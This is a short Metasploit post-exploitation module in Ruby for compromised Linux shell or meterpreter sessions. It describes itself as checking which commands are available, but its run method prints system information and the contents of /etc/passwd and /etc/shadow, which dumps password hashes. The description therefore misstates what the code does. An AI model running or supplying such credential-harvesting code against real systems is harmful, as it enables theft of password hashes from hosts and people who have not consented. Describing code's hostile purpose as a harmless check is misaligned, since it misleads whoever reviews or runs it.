require 'msf/core'
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize
    super(
      'Name'         => 'Testing commands needed in a function',
      'Description'  => %q{
        This module will be applied on a session connected to a shell. It will check which commands are available in the system.
      },
      'Author'       => 'Stephen Zupan',
      'License'      => MSF_LICENSE,
      'Platform'     => ['linux'],
      'SessionTypes' => ['shell', 'meterpreter']
)
    end

    def run
      print(cmd_exec('uname -a'))
      print(cmd_exec('cat /etc/passwd'))
      print(cmd_exec('cat /etc/shadow'))

   end
end